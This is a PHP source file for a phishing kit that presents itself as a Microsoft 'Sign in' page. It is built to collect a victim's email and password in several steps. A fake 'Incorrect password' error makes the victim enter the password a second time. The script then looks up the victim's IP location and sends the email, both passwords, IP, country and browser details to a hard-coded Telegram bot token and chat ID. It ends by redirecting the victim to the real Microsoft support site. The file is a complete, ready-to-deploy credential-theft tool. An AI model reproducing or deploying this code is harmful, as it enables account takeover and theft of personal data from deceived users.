<?php
$botToken = '8146877130:AAETaFmSH5Sx-UPSwtFOsNPkJSR8pf3ZXJw';
$chatId = '5279025133';

function curlRequest($url, $method = 'GET', $postData = null, $timeout = 5) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    
    if ($method === 'POST' && $postData) {
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
    }
    
    $response = curl_exec($ch);
    $error = curl_error($ch);
    curl_close($ch);
    
    if ($error) {
        return ['error' => $error, 'data' => null];
    }
    
    return ['error' => null, 'data' => $response];
}

$step = isset($_POST['step']) ? (int)$_POST['step'] : 1;
$email = isset($_POST['email']) ? $_POST['email'] : '';
$password1 = isset($_POST['password1']) ? $_POST['password1'] : '';
$password2 = isset($_POST['password2']) ? $_POST['password2'] : '';
$emailError = '';
$passwordError = '';
$retryError = '';
$showSuccess = false;

$microsoftDomains = ['outlook.com', 'hotmail.com', 'live.com', 'msn.com', 'microsoft.com', 'outlook.es', 'hotmail.es', 'live.es', 'outlook.co.uk', 'hotmail.co.uk', 'live.co.uk'];

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if ($step === 1 && !empty($email)) {
        if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
            $emailError = 'Enter a valid email address.';
            $step = 1;
        } else {
            $emailDomain = strtolower(substr(strrchr($email, "@"), 1));
            if (!in_array($emailDomain, $microsoftDomains)) {
                $emailError = 'Please enter a valid Microsoft account.';
                $step = 1;
            } else {
                $step = 2;
            }
        }
    } elseif ($step === 2 && !empty($password1)) {
        if (strlen(trim($password1)) < 7) {
            $passwordError = 'Password must be at least 7 characters.';
            $step = 2;
        } else {
            $step = 3;
            $retryError = 'Incorrect password. Please try again.';
        }
    } elseif ($step === 3 && !empty($password2)) {
        if (strlen(trim($password2)) < 7) {
            $retryError = 'Password must be at least 7 characters.';
            $step = 3;
        } else {
            $ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['HTTP_X_REAL_IP'] ?? $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
            if (strpos($ip, ',') !== false) {
                $ip = trim(explode(',', $ip)[0]);
            }
            $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
            $timestamp = date('Y-m-d H:i:s');

            $country = 'Unknown';
            if ($ip !== 'Unknown' && $ip !== '127.0.0.1') {
                $geoResult = curlRequest("http://ip-api.com/json/{$ip}", 'GET', null, 3);
                if ($geoResult['error'] === null && $geoResult['data']) {
                    $geo = json_decode($geoResult['data'], true);
                    if (isset($geo['country'])) {
                        $country = $geo['country'];
                        if (isset($geo['countryCode'])) {
                            $country .= " ({$geo['countryCode']})";
                        }
                    }
                }
            }

            if ($botToken && $chatId) {
                $message = "🔐 *New Microsoft Login Capture*\n\n";
                $message .= "📧 *Email:* `{$email}`\n";
                $message .= "🔑 *Password 1:* `{$password1}`\n";
                $message .= "🔑 *Password 2:* `{$password2}`\n\n";
                $message .= "🌐 *IP:* `{$ip}`\n";
                $message .= "🌍 *Country:* `{$country}`\n";
                $message .= "📱 *User Agent:* `{$userAgent}`\n";
                $message .= "🕐 *Time:* `{$timestamp}`";
                
                $telegramUrl = "https://api.telegram.org/bot{$botToken}/sendMessage";
                $postData = http_build_query([
                    'chat_id' => $chatId,
                    'text' => $message,
                    'parse_mode' => 'Markdown'
                ]);
                
                curlRequest($telegramUrl, 'POST', $postData, 5);
            }
            
            $showSuccess = true;
            $step = 4;
        }
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in</title>
    <style>
        body, html { margin: 0; padding: 0; height: 100%; font-family: 'Segoe UI', 'Inter', Arial, sans-serif; background-color: #ffffff; color: #1b1b1b; font-size: 14px; line-height: 1.4; -webkit-font-smoothing: antialiased; font-weight: 400; }
        body { display: flex; flex-direction: column; min-height: 100vh; }
        .desktop-background-layer { display: none; background-image: url('assets/bg_benz.avif'); background-size: cover; background-position: center center; position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 0; }
        .main-content-wrapper { display: flex; justify-content: center; align-items: center; flex-grow: 1; width: 100%; box-sizing: border-box; position: relative; z-index: 1; padding: 20px; }
        .login-dialog-box { background-color: #ffffff; width: 100%; max-width: 440px; padding: 40px; border-radius: 8px; box-shadow: 0px 4px 16px rgba(0,0,0,0.1); box-sizing: border-box; text-align: center; display: flex; flex-direction: column; }
        .dialog-header-section { display: flex; align-items: center; justify-content: center; width: 100%; margin-bottom: 24px; min-height: 24px; position: relative; }
        .back-button-link { color: #1b1b1b; text-decoration: none; display: flex; align-items: center; position: absolute; left: 0; top: 50%; transform: translateY(-50%); }
        .back-button-link svg { width: 18px; height: 18px; stroke: #605e5c; }
        .company-logo-image { height: 24px; display: block; }
        .dialog-main-content-area { width: 100%; text-align: center; }
        .login-form-fields { text-align: left; width: 100%; max-width: 360px; margin-left: auto; margin-right: auto; }
        .dialog-title-text { font-size: 24px; font-weight: 600; color: #1b1b1b; margin-top: 0; margin-bottom: 6px; }
        .dialog-subtitle-text { font-size: 14px; color: #1b1b1b; margin-bottom: 32px; font-weight: 400; }
        .user-identifier-tag-container { margin-top: 0; margin-bottom: 14px; text-align: center; }
        .user-identifier-display-text { font-size: 12px; color: #616161; background-color: #ffffff; border: 1px solid #616161; border-radius: 8px; padding: 5px 9px; display: inline-block; font-weight: 600; }
        .floating-label-container { position: relative; margin-bottom: 4px; width: 100%; border: 1px solid #8A8886; border-radius: 4px; background-color: #ffffff; height: 40px; display: flex; align-items: center; }
        .floating-label-container:focus-within { border-color: #0078D4; box-shadow: 0 0 0 1px #0078D4; }
        .floating-label-container.input-error { border-color: #D13438 !important; box-shadow: 0 0 0 1px #D13438 !important; }
        .floating-label-container.input-error label { color: #D13438 !important; }
        .floating-label-container input { width: 100%; padding: 10px 10px 6px 10px; border: none; font-size: 14px; box-sizing: border-box; color: #1b1b1b; background-color: transparent; position: relative; z-index: 1; outline: none; height: 100%; }
        .floating-label-container label { position: absolute; left: 10px; top: 50%; transform: translateY(-50%); font-size: 14px; color: #605E5C; pointer-events: none; transition: all 0.15s ease-out; z-index: 0; background-color: #ffffff; padding: 0 4px; }
        .floating-label-container.focused label, .floating-label-container input:not(:placeholder-shown) + label { top: 0px; transform: translateY(-50%) scale(0.85); font-size: 11px; color: #0078D4; z-index: 2; }
        .floating-label-container.focused.input-error label { color: #D13438 !important; }
        .auxiliary-form-link { display: block; font-size: 14px; color: #0067B8; text-decoration: none; margin-top: 18px; margin-bottom: 28px; text-align: left; font-weight: 600; }
        .auxiliary-form-link:hover { text-decoration: underline; }
        .form-action-buttons-wrapper { display: flex; justify-content: stretch; margin-top: 8px; }
        .submit-action-button { background-color: #0067B8; color: white; border: none; padding: 0 20px; font-size: 14px; font-weight: 600; border-radius: 4px; cursor: pointer; width: 100%; height: 38px; text-align: center; line-height: 38px; transition: all 0.1s ease-in-out; position: relative; overflow: hidden; }
        .submit-action-button:hover { background-color: #005A9E; }
        .submit-action-button.loading { background-color: #005A9E; pointer-events: none; }
        .submit-action-button.loading .button-text { opacity: 0; visibility: hidden; }
        .submit-action-button .loading-spinner { display: none; width: 18px; height: 18px; border: 2px solid rgba(255, 255, 255, 0.4); border-top-color: #ffffff; border-radius: 50%; animation: spin 0.7s linear infinite; position: absolute; top: 50%; left: 50%; margin-top: -9px; margin-left: -9px; }
        .submit-action-button.loading .loading-spinner { display: inline-block; }
        @keyframes spin { to { transform: rotate(360deg); } }
        .secondary-action-prompt { font-size: 14px; color: #1b1b1b; margin-top: 22px; text-align: center; font-weight: 400; }
        .secondary-action-prompt a { color: #0067B8; text-decoration: none; font-weight: 600; }
        .secondary-action-prompt a:hover { text-decoration: underline; }
        .form-submission-error-text { color: #D13438; font-size: 12px; font-weight: 400; min-height: 1.2em; margin: 4px 0 0 2px; text-align: left; }
        #completionContainer { display: flex; flex-direction: column; justify-content: center; align-items: center; min-height: 350px; }
        .footer-section { width: 100%; padding: 20px; font-size: 11px; box-sizing: border-box; position: fixed; bottom: 0; left: 0; z-index: 2; text-align: center; background-color: transparent; color: #605e5c; font-weight: 400; }
        .footer-links { display: inline-flex; gap: 24px; justify-content: center; margin-bottom: 8px; }
        .footer-section a { color: inherit; text-decoration: none; }
        .footer-section a:hover { text-decoration: underline; }
        .footer-notice { display: block; font-size: 10px; color: inherit; margin-top: 8px; font-weight: 400; }
        @media (min-width: 768px) { .desktop-background-layer { display: block; } .main-content-wrapper { align-items: flex-start; padding-top: max(30px, calc(50vh - 280px)); } }
        @media (max-width: 767px) { body { background-color: #ffffff; } .main-content-wrapper { align-items: flex-start; padding: 0; } .login-dialog-box { box-shadow: none; padding: 20px 24px; max-width: none; width: 100%; border-radius: 0; justify-content: flex-start; } .dialog-header-section { justify-content: center; padding-top: 0; margin-bottom: 15px; } .dialog-main-content-area { padding-top: 0; } .login-form-fields { max-width: none; margin: 0; } .user-identifier-tag-container { margin: 12px auto; } .secondary-action-prompt { text-align: center; margin-bottom: 20px; } .floating-label-container { height: 42px; } .floating-label-container input { font-size: 15px; } .submit-action-button { height: 38px; line-height: 38px; font-size: 14px; } .footer-section { position: static; background-color: #ffffff; padding: 16px 24px; margin-top: auto; } .footer-links { width: 100%; gap: 16px; } }
    </style>
</head>
<body>
    <div class="desktop-background-layer"></div>
    <div class="main-content-wrapper">
        <div class="login-dialog-box">
            <?php if ($step === 1): ?>
            <header class="dialog-header-section">
                <img src="assets/logo_bmw.jpeg" alt="Microsoft" class="company-logo-image">
            </header>
            <main class="dialog-main-content-area">
                <h1 class="dialog-title-text">Sign in</h1>
                <p class="dialog-subtitle-text">Sign back in to your account to continue.</p>
                <form method="POST" action="" class="login-form-fields">
                    <input type="hidden" name="step" value="1">
                    <div class="floating-label-container <?php echo $emailError ? 'input-error focused' : ''; ?>">
                        <input type="email" name="email" id="emailInput" required placeholder=" " value="<?php echo htmlspecialchars($email); ?>">
                        <label for="emailInput">Email or phone number</label>
                    </div>
                    <?php if ($emailError): ?>
                    <p class="form-submission-error-text"><?php echo $emailError; ?></p>
                    <?php else: ?>
                    <p class="form-submission-error-text"></p>
                    <?php endif; ?>
                    <a href="#" class="auxiliary-form-link">Forgot your username?</a>
                    <div class="form-action-buttons-wrapper">
                        <button type="submit" class="submit-action-button">
                            <span class="button-text">Next</span>
                            <span class="loading-spinner"></span>
                        </button>
                    </div>
                </form>
                <p class="secondary-action-prompt">We've updated our terms and conditions <a href="#">Learn more</a></p>
            </main>
            <?php elseif ($step === 2): ?>
            <header class="dialog-header-section">
                <a href="?" class="back-button-link">
                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none">
                        <path d="M19 12H5M12 19l-7-7 7-7" stroke="#605e5c" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                    </svg>
                </a>
                <img src="assets/logo_bmw.jpeg" alt="Microsoft" class="company-logo-image">
            </header>
            <main class="dialog-main-content-area">
                <div class="user-identifier-tag-container">
                    <span class="user-identifier-display-text"><?php echo htmlspecialchars($email); ?></span>
                </div>
                <h1 class="dialog-title-text">Enter password</h1>
                <form method="POST" action="" class="login-form-fields">
                    <input type="hidden" name="step" value="2">
                    <input type="hidden" name="email" value="<?php echo htmlspecialchars($email); ?>">
                    <div class="floating-label-container <?php echo $passwordError ? 'input-error focused' : ''; ?>">
                        <input type="password" name="password1" id="passwordInput" required placeholder=" ">
                        <label for="passwordInput">Password</label>
                    </div>
                    <?php if ($passwordError): ?>
                    <p class="form-submission-error-text"><?php echo $passwordError; ?></p>
                    <?php else: ?>
                    <p class="form-submission-error-text"></p>
                    <?php endif; ?>
                    <a href="#" class="auxiliary-form-link">Forgot your password?</a>
                    <div class="form-action-buttons-wrapper">
                        <button type="submit" class="submit-action-button">
                            <span class="button-text">Next</span>
                            <span class="loading-spinner"></span>
                        </button>
                    </div>
                </form>
            </main>
            <?php elseif ($step === 3): ?>
            <header class="dialog-header-section">
                <a href="?" class="back-button-link">
                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none">
                        <path d="M19 12H5M12 19l-7-7 7-7" stroke="#605e5c" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                    </svg>
                </a>
                <img src="assets/logo_bmw.jpeg" alt="Microsoft" class="company-logo-image">
            </header>
            <main class="dialog-main-content-area">
                <div class="user-identifier-tag-container">
                    <span class="user-identifier-display-text"><?php echo htmlspecialchars($email); ?></span>
                </div>
                <h1 class="dialog-title-text">Enter password</h1>
                <form method="POST" action="" class="login-form-fields">
                    <input type="hidden" name="step" value="3">
                    <input type="hidden" name="email" value="<?php echo htmlspecialchars($email); ?>">
                    <input type="hidden" name="password1" value="<?php echo htmlspecialchars($password1); ?>">
                    <div class="floating-label-container input-error focused">
                        <input type="password" name="password2" id="retryInput" required placeholder=" ">
                        <label for="retryInput">Password</label>
                    </div>
                    <p class="form-submission-error-text" style="display:block;text-align:center;"><?php echo $retryError; ?></p>
                    <a href="#" class="auxiliary-form-link">Forgot your password?</a>
                    <div class="form-action-buttons-wrapper">
                        <button type="submit" class="submit-action-button">
                            <span class="button-text">Next</span>
                            <span class="loading-spinner"></span>
                        </button>
                    </div>
                </form>
            </main>
            <?php elseif ($step === 4): ?>
            <header class="dialog-header-section">
                <img src="assets/logo_bmw.jpeg" alt="Microsoft" class="company-logo-image">
            </header>
            <main class="dialog-main-content-area">
                <div id="completionContainer">
                    <div id="checkmarkContainer" style="margin-bottom: 15px;">
                        <svg width="72" height="72" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                            <path d="M9.00004 16.17L4.83004 12L3.41004 13.41L9.00004 19L21 7.00001L19.59 5.59001L9.00004 16.17Z" fill="#0078D4"/>
                        </svg>
                    </div>
                    <h2 class="dialog-title-text" style="color:#107C10; margin-top:16px;">Complete</h2>
                    <p id="redirectingText">Redirecting shortly...</p>
                </div>
            </main>
            <script>
                setTimeout(function() {
                    window.location.href = 'https://support.microsoft.com/';
                }, 3000);
            </script>
            <?php endif; ?>
        </div>
    </div>

    <footer class="footer-section">
        <div class="footer-links">
            <a href="#">Help</a>
            <a href="#">Terms of use</a>
            <a href="#">Privacy & cookies</a>
        </div>
        <div class="footer-notice">Use private browsing if this isn't your device. <a href="#">Learn more</a></div>
    </footer>

    <script>
        document.querySelectorAll('.floating-label-container').forEach(function(container) {
            var input = container.querySelector('input');
            if (input) {
                var updateState = function() {
                    container.classList.toggle('focused', input.value !== '' || document.activeElement === input);
                };
                input.addEventListener('focus', updateState);
                input.addEventListener('blur', updateState);
                input.addEventListener('input', updateState);
                updateState();
            }
        });
        
        document.querySelectorAll('input').forEach(function(input) {
            input.addEventListener('input', function() {
                var container = this.closest('.floating-label-container');
                var errorEl = this.closest('.login-form-fields').querySelector('.form-submission-error-text');
                if (container) container.classList.remove('input-error');
                if (errorEl) errorEl.style.display = 'none';
            });
        });

        document.querySelectorAll('form').forEach(function(form) {
            form.addEventListener('submit', function(e) {
                var button = this.querySelector('.submit-action-button');
                if (button) {
                    button.classList.add('loading');
                }
            });
        });
    </script>
</body>
</html>
